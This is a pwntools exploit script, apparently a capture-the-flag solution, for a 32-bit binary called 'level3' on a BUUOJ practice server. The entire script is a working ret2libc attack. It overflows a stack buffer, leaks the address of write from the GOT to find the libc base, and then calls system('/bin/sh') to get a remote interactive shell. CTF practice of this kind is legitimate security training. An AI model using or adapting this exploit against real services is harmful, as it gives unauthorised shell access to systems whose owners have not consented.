from pwn import *

#p = process('./level3')
p = remote('node3.buuoj.cn', 25660)
elf = ELF('level3')

#libc = ELF('/lib/i386-linux-gnu/libc.so.6')
libc = ELF('libc-2.23.so')

write_plt = elf.plt['write']
write_got = elf.got['write']
vuln_addr = elf.symbols['vulnerable_function']

p.recvuntil('\n')

payload = b'a' * ( 0x88 + 4 ) + p32(write_plt) + p32(vuln_addr) + p32(1) + p32(write_got) + p32(4)

p.sendline(payload)

write_real_addr = u32(p.recv(4))
libc_base = write_real_addr - libc.symbols['write']

print('[+] libc_base -> {}'.format(hex(libc_base)))

system_addr = libc_base + libc.symbols['system']
bin_sh = libc_base + next(libc.search(b'/bin/sh'))

payload = b'a' * ( 0x88 + 4 ) + p32(system_addr) + p32(0x12345678) + p32(bin_sh)

p.recvuntil('\n')
p.sendline(payload)

p.interactive()
